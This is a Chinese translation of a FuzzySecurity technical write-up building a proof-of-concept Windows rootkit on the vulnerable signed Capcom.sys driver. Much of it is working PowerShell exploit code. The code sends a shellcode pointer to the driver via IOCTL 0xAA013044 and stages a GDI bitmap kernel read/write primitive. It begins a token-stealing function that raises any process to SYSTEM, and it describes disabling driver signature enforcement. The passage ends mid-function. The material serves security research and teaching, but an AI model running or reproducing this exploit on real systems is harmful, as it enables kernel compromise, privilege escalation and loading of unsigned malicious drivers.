# 【技术分享】Capcom Rootkit PoC的实现（含演示视频）
|
##### 译文声明
本文是翻译文章，文章来源：fuzzysecurity.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
****
翻译：[myswsun](http://bobao.360.cn/member/contribute?uid=2775084127)
预估稿费：160RMB
投稿方式：发送邮件至[linwei#360.cn](mailto:PI:EMAIL)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿
**0x00 前言**
最近，我读了一篇关于Derusbi恶意软件的[文章](http://www.sekoia.fr/blog/windows-driver-signing-bypass-by-derusbi/)。那篇文章主要是关于恶意软件作者使用了一种技术，利用签名的Novell驱动的漏洞（CVE-2013-3956）修改一些内核中的位来临时禁用驱动签名。一旦禁用了，Derusbi加载一个NDIS驱动，可能用来嗅探原始数据包的传输（我没有细看）。
不管怎样，我很好奇相同功能的PoC有多困难（事实是也不是很困难）。为了完整描述攻击者的场景，我决定使用签名驱动（Capcom.sys）中的漏洞，它首先由[TheWackOlian](https://twitter.com/TheWack0lian/status/779397840762245124)在2016年9月23日披露。
**0x01 资源**
Capcom-Rootkit（[@FuzzySec](https://twitter.com/fuzzysec)）-[这里](https://github.com/FuzzySecurity/Capcom-Rootkit)
Derusbi绕过Windows驱动签名 – [这里](http://www.sekoia.fr/blog/windows-driver-signing-bypass-by-derusbi/)
快速浏览强制驱动签名（[@j00ru](https://twitter.com/j00ru)） –
[这里](http://j00ru.vexillium.org/?p=377)
对抗X64强制驱动签名（[@hFireF0X](https://twitter.com/hfiref0x)）-[这里](http://www.kernelmode.info/forum/viewtopic.php?f=11&t=3322)
**0x02 驱动漏洞**
本文主要的目的不是分析驱动漏洞。我强烈建议你看下[@TheColonial](https://twitter.com/TheColonial)的演示，以更好的理解利用过程。
本质上，驱动提供了ring0代码执行作为一个服务。它唯一的功能是使用用户层的指针来禁用[SMEP](http://j00ru.vexillium.org/?p=783)，执行指针地址的代码并重新启用SMEP。函数的反汇编如下：
Powershell PoC如下，描述了如何利用。
    # Some tricks here
    # => cmp [rax-8], rcx
    echo "`n[>] Allocating Capcom payload.."
    [IntPtr]$Pointer = [CapCom]::VirtualAlloc([System.IntPtr]::Zero, (8 + $Shellcode.Length), 0x3000, 0x40)
    $ExploitBuffer = [System.BitConverter]::GetBytes($Pointer.ToInt64()+8) + $Shellcode
    [System.Runtime.InteropServices.Marshal]::Copy($ExploitBuffer, 0, $Pointer, (8 + $Shellcode.Length))
    echo "[+] Payload size: $(8 + $Shellcode.Length)"
    echo "[+] Payload address: $("{0:X}" -f $Pointer.ToInt64())"
    $hDevice = [CapCom]::CreateFile("\.Htsysm72FB", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
    if ($hDevice -eq -1) {
        echo "`n[!] Unable to get driver handle..`n"
        Return
    } else {
        echo "`n[>] Driver information.."
        echo "[+] lpFileName: \.Htsysm72FB"
        echo "[+] Handle: $hDevice"
    }
    # IOCTL = 0xAA013044
    #---    $InBuff = [System.BitConverter]::GetBytes($Pointer.ToInt64()+8)
    $OutBuff = 0x1234
    echo "`n[>] Sending buffer.."
    echo "[+] Buffer length: $($InBuff.Length)"
    echo "[+] IOCTL: 0xAA013044"
    [CapCom]::DeviceIoControl($hDevice, 0xAA013044, $InBuff, $InBuff.Length, [ref]$OutBuff, 4, [ref]0, [System.IntPtr]::Zero) |Out-null
有了执行任意的shellcode的能力，我选择了一个GDI
bitmap原语，能使我们获得在内核中永久性的读写的能力，而不用一遍又一遍的调用驱动。为了创建bitmap，我使用[Stage-gSharedInfoBitmap](https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Stage-gSharedInfoBitmap.ps1)，并且使用下面的形式构建了shellcode。
    # Leak BitMap pointers
    echo "`n[>] gSharedInfo bitmap leak.."
    $Manager = Stage-gSharedInfoBitmap
    $Worker = Stage-gSharedInfoBitmap
    echo "[+] Manager bitmap Kernel address: 0x$("{0:X16}" -f $($Manager.BitmapKernelObj))"
    echo "[+] Worker bitmap Kernel address: 0x$("{0:X16}" -f $($Worker.BitmapKernelObj))"
    # Shellcode buffer
    [Byte[]] $Shellcode = @(
        0x48, 0xB8) + [System.BitConverter]::GetBytes($Manager.BitmappvScan0) + @( # mov rax,$Manager.BitmappvScan0
        0x48, 0xB9) + [System.BitConverter]::GetBytes($Worker.BitmappvScan0)  + @( # mov rcx,$Manager.BitmappvScan0
        0x48, 0x89, 0x08,                                                          # mov qword ptr [rax],rcx
        0xC3                                                                       # ret
    )
这个技术的更多细节能在[@mwrlabs](https://twitter.com/mwrlabs)的标题[A Tale Of Bitmaps:
Leaking GDI Objects Post Windows 10 Anniversary
Edition](https://labs.mwrinfosecurity.com/blog/a-tale-of-bitmaps/)和我的Windows利用开发教程系列的[part
17](http://www.fuzzysecurity.com/tutorials/expDev/21.html)中找到。
**0x03 Rootkit功能**
现在我们有了内核中任意读写的能力，我们能开始完成我们的rootkit功能。我决定集中在两个不同的功能上：
1\. 将任意读写的PID提升到SYSTEM权限
2\. 在运行时禁用强制驱动签名，以便在内核中加载未签名的代码
**任意进程提权**
我们需要遍历EPROCESS结构链表，复制SYSTEM的EPROCESS令牌字段，并且使用这个值覆盖目标进程的EPROCESS结构。没有任何现成的漏洞，我们实际上可以在用户层泄漏一个指针指向System（PID
4）的EPROCESS入口。
应该注意，使用SystemModuleInformation能泄漏当前加载的NT内核的基址，
只在Windows8.1后的中等完整进程中起作用。我们能在Powershell简单实现这个过程，使用Get-LoadedModules，并在KD中验证我们的结果。
因此我们有了一种方法，来得到System的EPROCESS结构的指针，并使用我们的bitmap原语我们能够简单的读取与那个进程相关的SYSTEM令牌。最后一件事，我们需要遍历ActiveProcessLinks链表，来找到我们想要提权的进程的EPROCESS结构。列表结构如下（Windows
10 x64）。
这个列表是个双向循环列表。简单来说，我们将使用我们的bitmap原语来读取当前EPROCESS结构的PID，如果匹配了PID，我们将覆盖这个进程的令牌，如果不能匹配，我们从ActiveProcessLinks->Flink读取下个EPROCESS结构的地址，并重复。
EPROCESS结构是不透明的（未文档化），且不同的Windows系统会不同，但是我们能维护一个静态的偏移列表。我强烈推荐看一下[@rwfpl](https://twitter.com/rwfpl)的[Terminus
Project](http://terminus.rewolf.pl/terminus/)。偷取令牌的逻辑的Powershell实现如下。
    function Capcom-ElevatePID {
        param ([Int]$ProcPID)
        # Check our bitmaps have been staged into memory
        if (!$ManagerBitmap -Or !$WorkerBitmap) {
            Capcom-StageGDI
            if ($DriverNotLoaded -eq $true) {
                Return
            }
        }
        # Defaults to elevating Powershell
        if (!$ProcPID) {
            $ProcPID = $PID
        }
        # Make sure the pid exists!
        # 0 is also invalid but will default to $PID
        $IsValidProc = ((Get-Process).Id).Contains($ProcPID)
        if (!$IsValidProc) {
            Write-Output "`n[!] Invalid process specified!`n"
            Return
        }
        # _EPROCESS UniqueProcessId/Token/ActiveProcessLinks offsets based on OS
        # WARNING offsets are invalid for Pre-RTM images!
        $OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
        $OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
        switch ($OSMajorMinor)
        {
            '10.0' # Win10 / 2k16
            {
                $UniqueProcessIdOffset = 0x2e8
                $TokenOffset = 0x358          
                $ActiveProcessLinks = 0x2f0
            }